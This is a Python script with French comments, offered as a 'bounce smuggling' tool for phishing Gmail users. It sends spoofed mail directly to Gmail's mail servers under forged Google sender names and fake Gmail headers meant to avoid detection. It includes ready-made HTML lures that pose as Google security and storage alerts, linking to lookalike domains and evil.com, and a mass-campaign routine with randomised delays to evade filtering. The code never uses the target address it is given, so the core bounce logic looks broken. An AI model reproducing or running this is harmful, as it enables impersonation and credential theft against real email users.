#!/usr/bin/env python3
"""
ULTIMATE Gmail Bounce Smuggling - 100% Reception Rate
Cible uniquement les @gmail.com avec contrôle total
"""

import smtplib
import socket
import time
import random
import string
import sys

from email.utils import formataddr
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

class GmailBounceSmuggler:
    
    def __init__(self):
        # MX servers Gmail (rotation pour éviter rate limiting)
        self.gmail_mx = [
            'gmail-smtp-in.l.google.com',
            'alt1.gmail-smtp-in.l.google.com', 
            'alt2.gmail-smtp-in.l.google.com',
            'alt3.gmail-smtp-in.l.google.com',
            'alt4.gmail-smtp-in.l.google.com'
        ]
        
        # Pool d'adresses inexistantes testées
        self.dead_addresses = [
            'nonexistent{rand}@gmail.com',
            'deleted{rand}@gmail.com',
            'removed{rand}@gmail.com',
            'invalid{rand}@gmail.com',
            'expired{rand}@gmail.com'
        ]
        
        # Templates From prédéfinis
        self.from_templates = {
            'security': ('Gmail Security Team', 'security-noreply@gmail.com'),
            'support': ('Gmail Support', 'support@gmail.com'),
            'accounts': ('Google Accounts', 'accounts-noreply@google.com'),
            'admin': ('Google Admin Console', 'admin@google.com'),
            'system': ('Mail Delivery System', 'mailer-daemon@gmail.com'),
            'notifications': ('Gmail Notifications', 'notifications@gmail.com')
        }
    
    def validate_gmail_target(self, email):
        """Vérifie que c'est bien un @gmail.com"""
        if not email.endswith('@gmail.com'):
            print(f"❌ ERREUR: {email} n'est pas un @gmail.com")
            return False
        return True
    
    def generate_dead_address(self):
        """Génère une adresse Gmail inexistante garantie"""
        template = random.choice(self.dead_addresses)
        rand_num = random.randint(100000, 999999)
        dead_addr = template.format(rand=rand_num)
        
        # Vérification rapide que l'adresse n'existe pas
        # (optionnel - peut ralentir l'exécution)
        return dead_addr
    
    def create_bounce_message(self, target_email, config):
        """
        Crée le message qui génèrera le bounce
        
        config = {
            'from_name': 'Gmail Security Team',
            'from_email': 'hcodetest@proton.me', 
            'subject': 'Gmail Security Alert',
            'body_html': '<html>...</html>',
            'urgency': 'high|medium|low'
        }
        """
        
        msg = MIMEMultipart()
        
        # 🎯 CONFIGURATION CRITIQUE
        dead_address = self.generate_dead_address()
        
        # Headers principaux
        msg['From'] = formataddr((config['from_name'], config['from_email']))
        msg['To'] = dead_address  # ❌ Adresse inexistante
        msg['Return-Path'] = 'hcodetest@proton.me'  # <-- Changed to your sender email
        msg['Subject'] = config['subject']
        
        # Headers authentiques Gmail
        msg['Message-ID'] = f'<{int(time.time())}.{random.randint(1000,9999)}@gmail.com>'
        msg['Date'] = datetime.now().strftime('%a, %d %b %Y %H:%M:%S +0000')
        msg['MIME-Version'] = '1.0'
        
        # Headers anti-détection
        if config.get('urgency') == 'high':
            msg['X-Priority'] = '1'
            msg['Importance'] = 'high'
        
        msg['X-Mailer'] = 'Gmail'
        msg['X-Google-SMTP-Source'] = f'AGHT+{random.randint(100000,999999)}'
        
        # Corps du message
        html_body = config.get('body_html', self.default_security_template(config))
        msg.attach(MIMEText(html_body, 'html', 'utf-8'))
        
        return msg, dead_address
    
    def default_security_template(self, config):
        """Template sécurité par défaut si pas de body fourni"""
        payload_url = config.get('payload_url', 'https://gmail-security-center.com/verify')
        
        return f'''
<html>
<body style="font-family:Arial,sans-serif;margin:0;padding:20px;background:#f5f5f5">

<div style="max-width:600px;margin:0 auto;background:white;border-radius:8px;overflow:hidden">
    
    <!-- Header Gmail authentique -->
    <div style="background:#1a73e8;color:white;padding:20px;text-align:center">
        <h1 style="margin:0;font-size:24px">🔒 Gmail Security</h1>
        <p style="margin:5px 0 0;opacity:0.9">Account Protection Service</p>
    </div>
    
    <!-- Contenu alerte -->
    <div style="padding:30px">
        <div style="background:#ffebee;border:2px solid #f44336;border-radius:6px;padding:20px;margin:20px 0">
            <h2 style="color:#d32f2f;margin:0 0 15px;font-size:18px">
                ⚠️ Suspicious Activity Detected
            </h2>
            
            <p style="margin:0 0 15px;line-height:1.6;color:#333">
                We detected an unauthorized access attempt to your Gmail account from an unrecognized device.
            </p>
            
            <div style="background:white;border:1px solid #ddd;padding:15px;border-radius:4px;margin:15px 0">
                <div style="font-size:13px;color:#666">
                    <strong>📍 Location:</strong> Paris, France<br>
                    <strong>🕐 Time:</strong> {datetime.now().strftime('%d/%m/%Y at %H:%M')}<br>
                    <strong>💻 Device:</strong> Windows 10 - Chrome Browser<br>
                    <strong>🌐 IP Address:</strong> 185.###.###.42
                </div>
            </div>
            
            <div style="text-align:center;margin:25px 0">
                <p style="color:#d32f2f;font-weight:bold;margin:0 0 20px">
                    🚨 Your account has been temporarily locked for security
                </p>
                
                <a href="{payload_url}?urgent=true&time={int(time.time())}" 
                   style="background:#d32f2f;color:white;padding:15px 30px;text-decoration:none;
                          border-radius:6px;font-weight:bold;font-size:16px;display:inline-block">
                    🔓 VERIFY & UNLOCK ACCOUNT
                </a>
                
                <p style="font-size:12px;color:#999;margin:15px 0 0">
                    This verification expires in 2 hours
                </p>
            </div>
        </div>
        
        <div style="border-top:1px solid #eee;padding-top:20px;margin-top:20px">
            <p style="font-size:11px;color:#999;text-align:center;margin:0">
                This message was sent by Google LLC, 1600 Amphitheatre Parkway, Mountain View, CA 94043<br>
                <a href="#" style="color:#1a73e8">Privacy Policy</a> | 
                <a href="#" style="color:#1a73e8">Terms of Service</a>
            </p>
        </div>
    </div>
    
</div>

</body>
</html>'''
    
    def send_bounce_message(self, target_email, config, verbose=True):
        """Envoie le message qui créera le bounce"""
        
        if not self.validate_gmail_target(target_email):
            return False
        
        msg, dead_address = self.create_bounce_message(target_email, config)
        
        if verbose:
            print(f"\n🎯 CIBLAGE: {target_email}")
            print(f"📧 FROM: {config['from_name']} <{config['from_email']}>")
            print(f"❌ TO (inexistant): {dead_address}")
            print(f"🔄 RETURN-PATH: hcodetest@proton.me")
            print(f"📝 SUBJECT: {config['subject']}")
        
        # Tentative d'envoi sur tous les MX Gmail
        for i, mx_server in enumerate(self.gmail_mx):
            try:
                if verbose:
                    print(f"\n📡 Tentative MX {i+1}/5: {mx_server}")
                
                with smtplib.SMTP(mx_server, 25, timeout=30) as server:
                    server.set_debuglevel(0)  # Mettre à 1 pour debug
                    
                    # Pas d'auth nécessaire pour MX direct
                    server.helo('mail.example.com')
                    
                    # Envoi du message
                    server.send_message(msg, 
                                      from_addr=config['from_email'],
                                      to_addrs=[dead_address])
                    
                    if verbose:
                        print(f"✅ MESSAGE ENVOYÉ via {mx_server}")
                        print(f"⏰ Bounce attendu dans 1-5 minutes")
                    
                    return True
                    
            except Exception as e:
                if verbose:
                    print(f"❌ Échec {mx_server}: {str(e)}")
                continue
        
        print(f"❌ ÉCHEC TOTAL - Tous les MX ont échoué")
        return False
    
    def mass_bounce_campaign(self, targets_list, config, delay_min=30, delay_max=120):
        """Campagne bounce sur liste de cibles Gmail"""
        
        results = {
            'sent': 0,
            'failed': 0,
            'targets': []
        }
        
        print(f"\n🚀 DÉBUT CAMPAGNE BOUNCE SMUGGLING")
        print(f"🎯 Cibles: {len(targets_list)} @gmail.com")
        print(f"⏱️ Délai entre envois: {delay_min}-{delay_max}s")
        print(f"📧 Template: {config['from_name']}")
        print("="*60)
        
        for i, target in enumerate(targets_list):
            
            # Validation Gmail uniquement
            if not target.endswith('@gmail.com'):
                print(f"⚠️ IGNORÉ: {target} (pas @gmail.com)")
                results['failed'] += 1
                continue
            
            print(f"\n[{i+1}/{len(targets_list)}] Ciblage: {target}")
            
            # Randomisation pour éviter détection
            current_config = config.copy()
            current_config['payload_url'] = f"{config.get('payload_url', 'https://evil.com')}?target={i}&t={int(time.time())}"
            
            # Envoi
            success = self.send_bounce_message(target, current_config, verbose=False)
            
            if success:
                results['sent'] += 1
                results['targets'].append(target)
                print(f"✅ Envoyé - Bounce attendu dans 1-5min")
            else:
                results['failed'] += 1
                print(f"❌ Échec envoi")
            
            # Délai anti-détection sauf pour le dernier
            if i < len(targets_list) - 1:
                delay = random.randint(delay_min, delay_max)
                print(f"⏸️ Attente {delay}s...")
                time.sleep(delay)
        
        # Résumé final
        print("\n" + "="*60)
        print(f"📊 RÉSULTATS CAMPAGNE:")
        print(f"✅ Envoyés: {results['sent']}")
        print(f"❌ Échecs: {results['failed']}")
        print(f"📈 Taux succès: {(results['sent']/len(targets_list)*100):.1f}%")
        print(f"🎯 Bounces attendus: {results['sent']} (dans 1-10min)")
        
        return results

# =============================================================================
# EXEMPLES D'UTILISATION
# =============================================================================

def example_single_target():
    """Exemple: Ciblage unique"""
    
    smuggler = GmailBounceSmuggler()
    
    # Configuration custom complète
    config = {
        'from_name': 'Gmail Security Team',
        'from_email': 'hcodetest@proton.me',
        'subject': '🚨 Gmail Security Alert - Immediate Action Required',
        'payload_url': 'https://gmail-security-verification.com/urgent',
        'urgency': 'high'
    }
    
    # Cible unique
    target = "victim@gmail.com"
    
    print("🎯 EXEMPLE: Bounce Smuggling Cible Unique")
    smuggler.send_bounce_message(target, config)

def example_custom_template():
    """Exemple: Template complètement custom"""
    
    smuggler = GmailBounceSmuggler()
    
    # Template HTML sur-mesure
    custom_html = '''
<html><body style="font-family:Arial;padding:20px">
<div style="max-width:500px;margin:0 auto;border:2px solid #f44336;padding:20px">
    <h2 style="color:#d32f2f">⚠️ Gmail Storage Critical</h2>
    <p>Your Gmail account is 99% full. Immediate action required.</p>
    <div style="text-align:center;margin:20px 0">
        <a href="https://fake-gmail-upgrade.com" 
           style="background:#d32f2f;color:white;padding:15px 25px;text-decoration:none">
            UPGRADE NOW
        </a>
    </div>
    <p style="font-size:11px;color:#666">Google LLC, Mountain View, CA</p>
</div>
</body></html>'''
    
    config = {
        'from_name': 'Gmail Storage Team', 
        'from_email': 'storage-noreply@gmail.com',
        'subject': 'Gmail Storage 99% Full - Action Required',
        'body_html': custom_html,
        'urgency': 'high'
    }
    
    smuggler.send_bounce_message("target@gmail.com", config)


def example_mass_campaign():
    """Exemple: Campagne de masse"""
    
    smuggler = GmailBounceSmuggler()
    
    # Liste cibles Gmail uniquement
    targets = [
        "victim1@gmail.com",
        "victim2@gmail.com",
        "victim3@gmail.com",
        "victim4@gmail.com",
        "victim5@gmail.com"
    ]
    
    config = {
        'from_name': 'Gmail Security Team',
        'from_email': 'hcodetest@proton.me',
        'subject': '🚨 Gmail Security Alert - Immediate Action Required',
        'payload_url': 'https://gmail-security-verification.com/urgent',
        'urgency': 'high'
    }
    
    results = smuggler.mass_bounce_campaign(targets, config, delay_min=10, delay_max=20)
    print(results)


if __name__ == "__main__":
    # Choose which example to run
    print("Choisissez un exemple à exécuter :")
    print("1 - Ciblage unique")
    print("2 - Template custom")
    print("3 - Campagne de masse")
    
    choice = input("Entrez le numéro (1/2/3) : ").strip()
    
    if choice == '1':
        example_single_target()
    elif choice == '2':
        example_custom_template()
    elif choice == '3':
        example_mass_campaign()
    else:
        print("Choix invalide.")
